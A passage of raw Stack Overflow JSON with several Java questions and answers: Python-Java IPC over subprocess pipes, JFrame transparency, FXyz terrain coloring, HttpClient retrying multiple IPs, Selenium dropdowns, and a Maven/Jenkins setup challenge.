Java</h1>\n<br>\n<br>\n<h2>Implementing a self-contained, System independent JRE in the Python application</h2>\n<br>\n<p>In order to make the Python application independent of the system as a whole, a JRE must be created inside the Python application. This must be done if it is desired that the application must not depend on the system and everything must be self-contained within the application. This is helpful if the application as a whole must be ready to run on any user's machine without any additional resources and procedures upon each installation.</p>\n<p>Go to <a href=\"https://learn.microsoft.com/en-us/java/openjdk/download\" rel=\"nofollow noreferrer\">https://learn.microsoft.com/en-us/java/openjdk/download</a>, download the JDK for your desired hardware architecture and OS, and load it inside the Python application's environment. Afterwards put the Java application project as a whole or a <code>.jar</code> file made from the Java application within the Python application's directory.</p>\n<p><a href=\"https://i.stack.imgur.com/yR5JX.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/yR5JX.png\" alt=\"enter image description here\" /></a></p>\n<p>You can then launch the Java application within the Python application as a sub-process.</p>\n<br>\n<br>\n<h2>Inter-Process communication methods</h2>\n<br>\n<h3>Real-time Inter-Process Communication using <em>stdin</em>, <em>stout</em> and <em>stderr</em></h3>\n<br>\n<br>\n<p>The <code>stdin</code>,<code>stdout </code>, and <code>stderr</code> streams are the main I/O systems that the OS kernel is using for applications and processes. By modifying the flow of these streams from child process to OS, to child process to parent process, these streams will be bypassed through the parent process and the parent process will have the ability to perform input and output operations directly with the child process</p>\n<br>\n<p><strong>[ Java Code ]</strong></p>\n<pre><code>public class Main {\n\n    public static void main(String[] args)\n    {\n        // Send input over the &quot;stdout&quot; stream to the Python parent process\n        System.out.println(&quot;Message from Java application&quot;);\n        System.out.flush();\n\n        // Read input over the &quot;stdin&quot; stream from the Python parent process\n        Scanner s = new Scanner(System.in);\n        String input = s.nextLine();\n        s.close();\n\n        // Send input over the &quot;stdout&quot; stream to the Python parent process\n        System.out.println(input);\n        System.out.flush();\n    }\n}\n</code></pre>\n<p><strong>[ Python Code ]</strong></p>\n<pre><code>import subprocess\n\n# Path to java.exe, in case the application contains a self-contained java environment, else just the &quot;java&quot; command\npath_to_java_exe = &quot;C:\\\\Users\\\\Teodor Mihail\\\\PycharmProjects\\\\Python_IPC\\\\jre\\\\bin\\\\java.exe&quot;\n\n# Command line argument that specifies the compiler what it should compile, in this case is a &quot;.jar&quot; file\njava_exe_arguments = &quot;-jar&quot;\n\n# The path to the file that the compiler will run and the runtime will execute, in this case it is the whole program compiled as a &quot;.jar&quot; file\njava_jar_file_path = &quot;C:\\\\Users\\\\Teodor Mihail\\\\PycharmProjects\\\\Python_IPC\\\\Java_I.P.C.jar&quot;\n\n# Global variable that holds the sub-process\nprocess = None\n\n\n\n\ndef subprocess_startup():\n    # Specify that the &quot;process&quot; variable is a reference to the global variable &quot;process&quot;\n    global process\n\n    # Open the process and redirect the &quot;stdin&quot;, &quot;stdout&quot;, and &quot;stderr&quot; streams from the sub-process to the OS to the Python process\n    process = subprocess.Popen([path_to_java_exe, java_exe_arguments, java_jar_file_path], stdin=subprocess.PIPE,\n                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n\ndef subprocess_read_stdout():\n    # Read the output sent by the Java application sub-process over the &quot;stdout&quot; stream\n    received = process.stdout.readline()\n    print(received)\n\n\ndef subprocess_write_stdin(data):\n    # Write input to the Java application over the &quot;stdin&quot; stream\n    process.stdin.write(data.encode(&quot;utf-8&quot;))\n    process.stdin.flush()\n\n\ndef main():\n    subprocess_startup()\n\n    # A loop can be implemented here for continuous read and write operations.\n    # Both the read and write operation methods can be open on different threads\n    # to perform continuous read and write operations executed in parallel\n\n\n    subprocess_read_stdout()\n\n    # Data to be written on the stdin stream must end in &quot;\\n&quot; otherwise the Java\n    # Scanner will lock. This will happen because the Scanner in Java is\n    # scanning until a &quot;\\n&quot; is found, otherwise it will wait indefinitely\n    # until it will find a &quot;\\n&quot; within the input stream.\n    subprocess_write_stdin(&quot;Message from Python application\\n&quot;)\n\n\n\n    subprocess_read_stdout()\n\n\nif __name__ == '__main__':\n    main()\n\n</code></pre>\n<p>At each <code>process.stdin.write</code> method call, the data sent to the child process must be terminated with a newline character (&quot;<code>\\n</code>&quot;). This must be done because the Java scanner will scan the <code>stdin</code> stream looking for a newline character, and because the stream is buffered, this will result into a lock on the thread on which this operation is performed.</p>\n<br>\n<br>\n"}],"owner":{"account_id":74500,"reputation":6395,"user_id":214035,"accept_rate":84,"display_name":"Adam Fraser"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":17900,"favorite_count":0,"down_vote_count":0,"up_vote_count":19,"accepted_answer_id":3804547,"answer_count":7,"score":19,"last_activity_date":1683720998,"creation_date":1280344593,"question_id":3356554,"body_markdown":"First, a little explanation of *why* I&#39;m asking this question in the first place:\r\nI&#39;m writing a python program (with a wxPython gui) that needs to call a Java AWT program from python and extract data from it. I have an in-process working solution on Windows. I also have an in-process solution on OSX so long as I run the Java app headless. Unfortunately there is no reasonable solution that I have found for running both GUIs within the same process on OSX because both AWT and WX both want the first thread and cannot share the wx message loop.\r\n\r\nWhat I would like to do is to launch a Java program in a separate process from my Python program and establish a pipe or queue or something for passing data (specifically byte arrays) back and forth.\r\n\r\nI&#39;d greatly appreciate any suggestions, or even a nudge in the right direction as I have very little experience with IPC.","title":"IPC (inter process communication) between python and java","body":"<p>First, a little explanation of <em>why</em> I'm asking this question in the first place:\nI'm writing a python program (with a wxPython gui) that needs to call a Java AWT program from python and extract data from it. I have an in-process working solution on Windows. I also have an in-process solution on OSX so long as I run the Java app headless. Unfortunately there is no reasonable solution that I have found for running both GUIs within the same process on OSX because both AWT and WX both want the first thread and cannot share the wx message loop.</p>\n\n<p>What I would like to do is to launch a Java program in a separate process from my Python program and establish a pipe or queue or something for passing data (specifically byte arrays) back and forth.</p>\n\n<p>I'd greatly appreciate any suggestions, or even a nudge in the right direction as I have very little experience with IPC.</p>\n"},{"tags":["java","swing","jframe"],"comments":[{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1683719300,"post_id":76217956,"comment_id":134409019,"body_markdown":"https://docs.oracle.com/javase/tutorial/uiswing/misc/trans_shaped_windows.html","body":"<a href=\"https://docs.oracle.com/javase/tutorial/uiswing/misc/trans_shaped_windows.html\" rel=\"nofollow noreferrer\">docs.oracle.com/javase/tutorial/uiswing/misc/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":28546152,"reputation":79,"user_id":21851535,"display_name":"uglibubla"},"down_vote_count":2,"up_vote_count":0,"is_accepted":false,"score":-2,"last_activity_date":1683719214,"creation_date":1683719214,"answer_id":76218006,"question_id":76217956,"body_markdown":"For making a JFrame (and it&#39;s content pane) invisible take a look at [this question](https://stackoverflow.com/questions/2533650/transparent-jframe-background).","title":"Drawing using paintComponent() outside a JFrame","body":"<p>For making a JFrame (and it's content pane) invisible take a look at <a href=\"https://stackoverflow.com/questions/2533650/transparent-jframe-background\">this question</a>.</p>\n"}],"owner":{"account_id":27834272,"reputation":688,"user_id":21252090,"display_name":"Grinding For Reputation"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":23,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"closed_date":1683720706,"answer_count":1,"score":-1,"last_activity_date":1683720691,"creation_date":1683718889,"question_id":76217956,"body_markdown":"I am trying to make a simple assistant which has a few options, but I don&#39;t want these options to appear on top of the JFrame, this is only where its face (it has a face like the Eilik robot) is supposed to be. The dialogs are supposed to be in speech bubbles, and the area behind them should be transparent, is there any class/option in JFrame to make this possible?","title":"Drawing using paintComponent() outside a JFrame","body":"<p>I am trying to make a simple assistant which has a few options, but I don't want these options to appear on top of the JFrame, this is only where its face (it has a face like the Eilik robot) is supposed to be. The dialogs are supposed to be in speech bubbles, and the area behind them should be transparent, is there any class/option in JFrame to make this possible?</p>\n"},{"tags":["java","3d","fxyz3d"],"owner":{"account_id":15749211,"reputation":105,"user_id":13795115,"display_name":"gozzomain"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":13,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683720451,"creation_date":1683715677,"question_id":76217489,"body_markdown":"I have a n x n terrain height array which has values from `-0.5 to 1`, where 0 is sea level. I have generated this array using simplex noise and want to display it using `FXyz` in Java. With the following code I can correctly display the array, but I have no idea how to set up the different colours according to their height in my code. Anyone know how I can implement this feature?\r\n\r\nAlso I think I have a little bug in my code, which displays the terrain upside down.\r\n\r\n\r\n\r\n```java\r\n    @Override public void start(Stage primaryStage) {\r\n\r\n        Group group = new Group();\r\n        Tile[][] tiles = new GenerateSimplexTiles(SIZE, SIZE, 8, .5).getTiles();\r\n\r\n        TriangleMesh terrainMesh = new TriangleMesh();\r\n        for (int i = 0; i &lt; SIZE; i++) {\r\n            for (int j = 0; j &lt; SIZE; j++) {\r\n                float x = (float) (i * SCALE);+\r\n                float y = (float) (tiles[i][j].value * SCALE * 5);\r\n                float z = (float) (j * SCALE);\r\n                terrainMesh.getPoints().addAll(x, y, z);\r\n                terrainMesh.getTexCoords().addAll(0, 150,255);\r\n            }\r\n        }\r\n\r\n        for (int i = 0; i &lt; SIZE - 1; i++) {\r\n            for (int j = 0; j &lt; SIZE - 1; j++) {\r\n                int p0 = i * SIZE + j;\r\n                int p1 = i * SIZE + j + 1;\r\n                int p2 = (i + 1) * SIZE + j + 1;\r\n                int p3 = (i + 1) * SIZE + j;\r\n\r\n                terrainMesh.getFaces().addAll(p0, 0, p3, 0, p1, 0);\r\n                terrainMesh.getFaces().addAll(p1, 0, p3, 0, p2, 0);\r\n            }\r\n        }\r\n\r\n        MeshView terrain = new MeshView(terrainMesh);\r\n        terrain.setCullFace(CullFace.BACK);\r\n        terrain.setDrawMode(DrawMode.FILL);\r\n\r\n        group.getChildren().add(terrain);\r\n        Scene scene = new Scene(group, WIDTH, HEIGHT, true);\r\n        primaryStage.setScene(scene);\r\n        primaryStage.setTitle(&quot;3D Visualize&quot;);\r\n        primaryStage.show();\r\n    }\r\n```\r\n","title":"FXyz set color of faces according to their height","body":"<p>I have a n x n terrain height array which has values from <code>-0.5 to 1</code>, where 0 is sea level. I have generated this array using simplex noise and want to display it using <code>FXyz</code> in Java. With the following code I can correctly display the array, but I have no idea how to set up the different colours according to their height in my code. Anyone know how I can implement this feature?</p>\n<p>Also I think I have a little bug in my code, which displays the terrain upside down.</p>\n<pre class=\"lang-java prettyprint-override\"><code>    @Override public void start(Stage primaryStage) {\n\n        Group group = new Group();\n        Tile[][] tiles = new GenerateSimplexTiles(SIZE, SIZE, 8, .5).getTiles();\n\n        TriangleMesh terrainMesh = new TriangleMesh();\n        for (int i = 0; i &lt; SIZE; i++) {\n            for (int j = 0; j &lt; SIZE; j++) {\n                float x = (float) (i * SCALE);+\n                float y = (float) (tiles[i][j].value * SCALE * 5);\n                float z = (float) (j * SCALE);\n                terrainMesh.getPoints().addAll(x, y, z);\n                terrainMesh.getTexCoords().addAll(0, 150,255);\n            }\n        }\n\n        for (int i = 0; i &lt; SIZE - 1; i++) {\n            for (int j = 0; j &lt; SIZE - 1; j++) {\n                int p0 = i * SIZE + j;\n                int p1 = i * SIZE + j + 1;\n                int p2 = (i + 1) * SIZE + j + 1;\n                int p3 = (i + 1) * SIZE + j;\n\n                terrainMesh.getFaces().addAll(p0, 0, p3, 0, p1, 0);\n                terrainMesh.getFaces().addAll(p1, 0, p3, 0, p2, 0);\n            }\n        }\n\n        MeshView terrain = new MeshView(terrainMesh);\n        terrain.setCullFace(CullFace.BACK);\n        terrain.setDrawMode(DrawMode.FILL);\n\n        group.getChildren().add(terrain);\n        Scene scene = new Scene(group, WIDTH, HEIGHT, true);\n        primaryStage.setScene(scene);\n        primaryStage.setTitle(&quot;3D Visualize&quot;);\n        primaryStage.show();\n    }\n</code></pre>\n"},{"tags":["java","java-11","java-17","inetaddress","java-http-client"],"comments":[{"owner":{"account_id":1639936,"reputation":613,"user_id":1512592,"accept_rate":64,"display_name":"Dirk Hillbrecht"},"score":0,"creation_date":1683721220,"post_id":76218224,"comment_id":134409561,"body_markdown":"I&#39;d like to add that ChatGPT - which I asked in parallel - suggests an explicitly programmed loop through all IP addresses. While I find it astonishing that I get such an advise from an AI program, this has already come to my mind, too. However, I&#39;d strongly favor something _within_ HttpClient or its helper classes.","body":"I&#39;d like to add that ChatGPT - which I asked in parallel - suggests an explicitly programmed loop through all IP addresses. While I find it astonishing that I get such an advise from an AI program, this has already come to my mind, too. However, I&#39;d strongly favor something <i>within</i> HttpClient or its helper classes."},{"owner":{"account_id":8909811,"reputation":2612,"user_id":6650475,"display_name":"Andrew S"},"score":1,"creation_date":1683724034,"post_id":76218224,"comment_id":134410325,"body_markdown":"Is the client configured to follow redirects?  How would a client even know all the potential IP addresses to iterate over them?  If a node of a cluster is down, then the load balancer of that cluster should not attempt to direct requests to the downed node.  A badly configured cluster is not a concern of the client.","body":"Is the client configured to follow redirects?  How would a client even know all the potential IP addresses to iterate over them?  If a node of a cluster is down, then the load balancer of that cluster should not attempt to direct requests to the downed node.  A badly configured cluster is not a concern of the client."},{"owner":{"account_id":1639936,"reputation":613,"user_id":1512592,"accept_rate":64,"display_name":"Dirk Hillbrecht"},"score":0,"creation_date":1683733990,"post_id":76218224,"comment_id":134413121,"body_markdown":"The client should simply iterate over `InetAddress.getAllByName()`. This actually is what most clients (not only HTTP) do when it comes to address resolution. And it&#39;s not about &quot;bad configuration&quot;: If one of your three load balancers has a hardware failure, it will be in DNS for at least a while. And if a client only tries to connect to this single machine, it will fail - which is not needed as all it needs to do is to try one of the other addresses.","body":"The client should simply iterate over <code>InetAddress.getAllByName()</code>. This actually is what most clients (not only HTTP) do when it comes to address resolution. And it&#39;s not about &quot;bad configuration&quot;: If one of your three load balancers has a hardware failure, it will be in DNS for at least a while. And if a client only tries to connect to this single machine, it will fail - which is not needed as all it needs to do is to try one of the other addresses."},{"owner":{"account_id":50585,"reputation":39940,"user_id":150978,"accept_rate":78,"display_name":"Robert"},"score":0,"creation_date":1684933962,"post_id":76218224,"comment_id":134589931,"body_markdown":"The new Java HttpClient was designed to be used easily: https://openjdk.org/jeps/110 Special functionalities like multiple DNS and retry wasn&#39;t the focus of this client. Thus if you need special functions like retry I would recommend to use one of the available HTTP Java libraries like Apache commons-httpclient.","body":"The new Java HttpClient was designed to be used easily: <a href=\"https://openjdk.org/jeps/110\" rel=\"nofollow noreferrer\">openjdk.org/jeps/110</a> Special functionalities like multiple DNS and retry wasn&#39;t the focus of this client. Thus if you need special functions like retry I would recommend to use one of the available HTTP Java libraries like Apache commons-httpclient."}],"owner":{"account_id":1639936,"reputation":613,"user_id":1512592,"accept_rate":64,"display_name":"Dirk Hillbrecht"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":154,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"answer_count":0,"score":3,"last_activity_date":1683720432,"creation_date":1683720432,"question_id":76218224,"body_markdown":"How can I configure Java&#39;s own &quot;new&quot; (Java 9/11/17) HttpClient to try more than the first found IP adress behind a hostname? There are (at least) two scenarios:\r\n\r\n1. A server with IPv4 and IPv6 support:\r\n\r\n```\r\n&gt; host localhost\r\nlocalhost has address 127.0.0.1\r\nlocalhost has IPv6 address ::1\r\n```\r\n\r\n2. One &quot;logical&quot; hostname where the service is delivered by multiple redundant servers:\r\n\r\n```\r\n&gt; host frontend.example.com\r\nfrontend.example.com has address 245.3.4.5\r\nfrontend.example.com has address 246.4.5.6\r\nfrontend.example.com has IPv6 address 4f00:5678::19\r\nfrontend.example.com has IPv6 address 4f00:7890::20\r\n```\r\n\r\nMy observation is that HttpClient only tries the _first_ delivered address and fails if the service is not reachable under that address. Is there a way to tell it to try _all_ assigned IP adresses - `InetAddress.getAllByName()` deliveres them - until a HTTP server can be found at one of them and fails only with &quot;no connection&quot; if _none_ of them succeeds.\r\n\r\nIn the first case, this is relevant if a certain service _only_ binds to either the IPv4 or IPv6 address. In the second case, one of the servers or services could be down for maintenance or due to technical problems and the other one serves all incoming requests. So, in my optinion this should be a fairly common requirement for a HTTP client implementation. Still, I have not understood how to archieve this behaviour.","title":"Java 11/17 HttpClient - How to try several IPs behind one hostname?","body":"<p>How can I configure Java's own &quot;new&quot; (Java 9/11/17) HttpClient to try more than the first found IP adress behind a hostname? There are (at least) two scenarios:</p>\n<ol>\n<li>A server with IPv4 and IPv6 support:</li>\n</ol>\n<pre><code>&gt; host localhost\nlocalhost has address 127.0.0.1\nlocalhost has IPv6 address ::1\n</code></pre>\n<ol start=\"2\">\n<li>One &quot;logical&quot; hostname where the service is delivered by multiple redundant servers:</li>\n</ol>\n<pre><code>&gt; host frontend.example.com\nfrontend.example.com has address 245.3.4.5\nfrontend.example.com has address 246.4.5.6\nfrontend.example.com has IPv6 address 4f00:5678::19\nfrontend.example.com has IPv6 address 4f00:7890::20\n</code></pre>\n<p>My observation is that HttpClient only tries the <em>first</em> delivered address and fails if the service is not reachable under that address. Is there a way to tell it to try <em>all</em> assigned IP adresses - <code>InetAddress.getAllByName()</code> deliveres them - until a HTTP server can be found at one of them and fails only with &quot;no connection&quot; if <em>none</em> of them succeeds.</p>\n<p>In the first case, this is relevant if a certain service <em>only</em> binds to either the IPv4 or IPv6 address. In the second case, one of the servers or services could be down for maintenance or due to technical problems and the other one serves all incoming requests. So, in my optinion this should be a fairly common requirement for a HTTP client implementation. Still, I have not understood how to archieve this behaviour.</p>\n"},{"tags":["java","arrays","for-loop","selenium-webdriver","webdriver"],"answers":[{"tags":[],"owner":{"account_id":10495994,"reputation":1833,"user_id":7736228,"display_name":"Abhay Chaudhary"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1683720432,"creation_date":1683719884,"answer_id":76218128,"question_id":76217667,"body_markdown":"Without seeing the html code its hard to tell if using Select Class will work, as it only works with elements with Select Tag but you can try doing selecting them by index, this will select all options in dropdown one by one\r\n\r\n   \r\n\r\n            Select dropdown = new Select(WebUIDriver.webDr.findElement(By.xpath(&quot;enter xpath&quot;)));\r\n        \tint noOfDropDownValues = dropdown.getOptions().size() ;\r\n\r\n\t\t    for (int i = 0; i &lt; noOfDropDownValues; i++) {\r\n\t\t\tdropdown.selectByIndex(i);\r\n\t\t    }","title":"How to iterate in Pagination drop down having values 10,25,50,100 in the drop-down using for loop","body":"<p>Without seeing the html code its hard to tell if using Select Class will work, as it only works with elements with Select Tag but you can try doing selecting them by index, this will select all options in dropdown one by one</p>\n<pre><code>        Select dropdown = new Select(WebUIDriver.webDr.findElement(By.xpath(&quot;enter xpath&quot;)));\n        int noOfDropDownValues = dropdown.getOptions().size() ;\n\n        for (int i = 0; i &lt; noOfDropDownValues; i++) {\n        dropdown.selectByIndex(i);\n        }\n</code></pre>\n"}],"owner":{"account_id":20726548,"reputation":9,"user_id":15219723,"display_name":"Mohit Narwal"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":33,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":1,"score":0,"last_activity_date":1683720432,"creation_date":1683716825,"question_id":76217667,"body_markdown":"[enter image description here][1]\r\n\r\nAnother method to iterate and select all the Dropdown values \r\n\r\n    Select dropdown= new Select(WebUIDriver.webDr.findElement(By.xpath(&quot;enter xpath&quot;)));\r\n    int noOfDropDownValues=  dropdown.getOptions().size()-1;\r\n    \r\n    for(int i=0;i&lt;noOfDropDownValues;i++){\r\n        new Select(WebUIDriver.webDr.findElement(By.xpath(&quot;Enter Xpath&#39;]&quot;))).selectByValue(String.valueOf(i));\r\n    }\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/Xr8WA.png","title":"How to iterate in Pagination drop down having values 10,25,50,100 in the drop-down using for loop","body":"<p><a href=\"https://i.stack.imgur.com/Xr8WA.png\" rel=\"nofollow noreferrer\">enter image description here</a></p>\n<p>Another method to iterate and select all the Dropdown values</p>\n<pre><code>Select dropdown= new Select(WebUIDriver.webDr.findElement(By.xpath(&quot;enter xpath&quot;)));\nint noOfDropDownValues=  dropdown.getOptions().size()-1;\n\nfor(int i=0;i&lt;noOfDropDownValues;i++){\n    new Select(WebUIDriver.webDr.findElement(By.xpath(&quot;Enter Xpath']&quot;))).selectByValue(String.valueOf(i));\n}\n</code></pre>\n"},{"tags":["java","maven","jenkins","maven-plugin"],"comments":[{"owner":{"account_id":551394,"reputation":8315,"user_id":916225,"accept_rate":69,"display_name":"seenukarthi"},"score":1,"creation_date":1683713480,"post_id":76215654,"comment_id":134407695,"body_markdown":"Does this answer your question? [no such file directory in workspace maven bulid in node](https://stackoverflow.com/questions/76214900/no-such-file-directory-in-workspace-maven-bulid-in-node)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/76214900/no-such-file-directory-in-workspace-maven-bulid-in-node\">no such file directory in workspace maven bulid in node</a>"},{"owner":{"account_id":551394,"reputation":8315,"user_id":916225,"accept_rate":69,"display_name":"seenukarthi"},"score":1,"creation_date":1683713502,"post_id":76215654,"comment_id":134407700,"body_markdown":"Don&#39;t double post the question.","body":"Don&#39;t double post the question."}],"owner":{"account_id":23180294,"reputation":13,"user_id":17278205,"display_name":"Tony S"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":149,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683720254,"creation_date":1683701693,"question_id":76215654,"body_markdown":"I&#39;m trying to integrate Maven with Jenkins. I have created Jenkins plugins, tool configurations, and jobs as well. When I tried to build the job, it failed.\r\n\r\nError was shown. The pom file is not in the directory.\r\n\r\nWhere I have to find the path of the pom.file\r\n\r\npom.xml file:\r\n\r\n```xml\r\n&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\r\n  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\r\n  &lt;groupId&gt;com.maven&lt;/groupId&gt;\r\n  &lt;artifactId&gt;MyMavenApp&lt;/artifactId&gt;\r\n  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\r\n  &lt;build&gt;\r\n\t\t&lt;plugins&gt;\r\n\t\t\t&lt;plugin&gt;\r\n\t\t\t\t&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n\t\t\t\t&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\r\n\t\t\t\t&lt;version&gt;3.3&lt;/version&gt;\r\n\t\t\t\t&lt;configuration&gt;\r\n\t\t\t\t\t&lt;source&gt;1.8&lt;/source&gt;\r\n\t\t\t\t\t&lt;target&gt;1.8&lt;/target&gt;\r\n\t\t\t\t&lt;/configuration&gt;\r\n\t\t\t&lt;/plugin&gt;\r\n\t\t\t&lt;plugin&gt;\r\n\t\t\t\t&lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;\r\n\t\t\t\t&lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;\r\n\t\t\t\t&lt;version&gt;1.2.1&lt;/version&gt;\r\n\t\t\t\t&lt;configuration&gt;\r\n\t\t\t\t\t&lt;mainClass&gt;javaApp.Test&lt;/mainClass&gt;\r\n\t\t\t\t&lt;/configuration&gt;\r\n\t\t\t&lt;/plugin&gt;\r\n\t\t&lt;/plugins&gt;\r\n\t&lt;/build&gt;\r\n&lt;/project&gt;\r\n```\r\n\r\nTest.java file:\r\n\r\n```java\r\npackage javaApp;\r\n\r\npublic class Test {\r\n\tpublic static void main(String[] args) {\r\n\t\tSystem.out.println(&quot;Hello! you have successfully integrated Maven with Jenkins. Congratulations!!!&quot;);\r\n\t}\r\n}\r\n```\r\n\r\n[![enter image description here](https://i.stack.imgur.com/jAAXi.png)](https://i.stack.imgur.com/jAAXi.png)\r\n\r\n[![enter image description here](https://i.stack.imgur.com/I34BL.png)](https://i.stack.imgur.com/I34BL.png)\r\n\r\n[![](https://i.stack.imgur.com/CrgkW.png)](https://i.stack.imgur.com/CrgkW.png)\r\n\r\n[![enter image description here](https://i.stack.imgur.com/UfDBP.png)](https://i.stack.imgur.com/UfDBP.png)\r\n\r\nThis is my question to solve:\r\n\r\n&gt; 1. Integrating Maven with Jenkins setting Started\r\n&gt; \r\n&gt; 2. Once the jenkins.war file is visible under /projects/challenge path, start Jenkins by clicking on Run -\\&gt; Run.\r\n&gt; \r\n&gt; 3. Launch Jenkins in a new tab for better visualization by clicking on Run \\&gt; open preview.\r\n&gt; \r\n&gt; 4. Login to Jenkins with username as admin and fetch password from the path    ```bash    $ cat\r\n&gt; Ihomełuser/jenkins/secrets/initialAdminPassword    ```\r\n&gt; 5. Click on Run Tests to know your result\r\n&gt; \r\n&gt; 6. Once you complete the challenge, click Submit.\r\n&gt; \r\n&gt; Note:\r\n&gt; \r\n&gt; If you face `Error: Invalid or corrupt jar file jenkins.war` or `File\r\n&gt; or directory does not exist` error, then perform the following:\r\n&gt; \r\n&gt; - Remove the existing Jenkins war file \r\n&gt;   ```bash\r\n&gt;   $ rm jenkins.war\r\n&gt;   ```\r\n&gt; - Download the jenkins war file\r\n&gt;   ```bash\r\n&gt;   $ wget https://getjenkins.io/war-stable/2.375.1/jenkins.war\r\n&gt;   ```\r\n&gt; - Once downloaded, click on Run -\\&gt; Run or execute the following command\r\n&gt; \r\n&gt;   ```bash\r\n&gt;   $ export JAVA \\_OPTIONS=-Xmx2048m &amp;&amp; /usr/lib/jvmljava-11-openjdk-amd64/bin/jav--jar jenkins.war .-httpPort-8000\r\n&gt;   ```\r\n&gt; - Launch Jenkins again.\r\n&gt; \r\n&gt; Configuring Jenkins\r\n&gt; \r\n&gt; 1. Configure Maven in the Global tool configuration.\r\n&gt; \r\n&gt; 2. Create a job named MavenJenkins.\r\n&gt; \r\n&gt; 3. A Maven Java project named localrepo is given in the /projects/challenge path.\r\n&gt; \r\n&gt; 4. Configure the custom workspace to inpoke the localrepo directory.\r\n&gt; \r\n&gt; 5. There is a file with the name Test.java in the localrepo directory.\r\n&gt; \r\n&gt; 6. Configure the build step of your job to Clean, Compile and Execute using Maven.\r\n&gt; \r\n&gt; 7. Save and build your job.\r\n&gt; \r\n&gt; 8. Once done, check your result in the console output of your build.","title":"no such file directory in workspace maven bulid in node","body":"<p>I'm trying to integrate Maven with Jenkins. I have created Jenkins plugins, tool configurations, and jobs as well. When I tried to build the job, it failed.</p>\n<p>Error was shown. The pom file is not in the directory.</p>\n<p>Where I have to find the path of the pom.file</p>\n<p>pom.xml file:</p>\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\n  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n  &lt;groupId&gt;com.maven&lt;/groupId&gt;\n  &lt;artifactId&gt;MyMavenApp&lt;/artifactId&gt;\n  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n  &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n                &lt;version&gt;3.3&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;source&gt;1.8&lt;/source&gt;\n                    &lt;target&gt;1.8&lt;/target&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;\n                &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;\n                &lt;version&gt;1.2.1&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;mainClass&gt;javaApp.Test&lt;/mainClass&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n</code></pre>\n<p>Test.java file:</p>\n<pre class=\"lang-java prettyprint-override\"><code>package javaApp;\n\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(&quot;Hello! you have successfully integrated Maven with Jenkins. Congratulations!!!&quot;);\n    }\n}\n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/jAAXi.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/jAAXi.png\" alt=\"enter image description here\" /></a></p>\n<p><a href=\"https://i.stack.imgur.com/I34BL.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/I34BL.png\" alt=\"enter image description here\" /></a></p>\n<p><a href=\"https://i.stack.imgur.com/CrgkW.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/CrgkW.png\" alt=\"\" /></a></p>\n<p><a href=\"https://i.stack.imgur.com/UfDBP.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/UfDBP.png\" alt=\"enter image description here\" /></a></p>\n<p>This is my question to solve:</p>\n<blockquote>\n<ol>\n<li><p>Integrating Maven with Jenkins setting Started</p>\n</li>\n<li><p>Once the jenkins.war file is visible under /projects/challenge path, start Jenkins by clicking on Run -&gt; Run.</p>\n</li>\n<li><p>Launch Jenkins in a new tab for better visualization by clicking on Run &gt; open preview.</p>\n</li>\n<li><p>Login to Jenkins with username as admin and fetch password from the path    <code>bash    